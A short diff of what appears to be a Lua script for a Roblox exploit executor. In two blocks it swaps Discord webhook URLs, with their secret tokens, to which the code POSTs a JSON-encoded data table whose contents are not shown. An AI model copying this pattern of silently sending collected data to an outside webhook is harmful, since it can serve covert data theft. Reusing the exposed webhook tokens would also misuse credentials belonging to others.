@@ -231,7 +231,7 @@ _G.check1 = true
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final1 = {Url = "https://discord.com/api/webhooks/1097196083563724840/J1KIsmGJe3L_mG5QcMHnpirVNU37yC3A-dCMmzIm2viNifWGKBN0EvLeV-33mzBX15Zz", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1097204681039675412/oRXIYLs3xDhBuAIIAz-vtJKC2Tw32odQjycIn4fLhqXD4jefTkLuUjYveGAV8xifiN1D", Body = Encoded, Method = "POST", Headers = Headers}
                    
                     Request(Final1)
 end
@@ -267,7 +267,7 @@ _G.check2= true
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final1 = {Url = "https://discord.com/api/webhooks/1097196083563724840/J1KIsmGJe3L_mG5QcMHnpirVNU37yC3A-dCMmzIm2viNifWGKBN0EvLeV-33mzBX15Zz", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1097204685452083331/rMQddCc0FhAXV_9f1mVtOH4rJNXeDoMOJYmUCpz5bhmDuNfC_5jvx-HlystO4pNu2Pu2", Body = Encoded, Method = "POST", Headers = Headers}
                    
                     Request(Final1)
 end
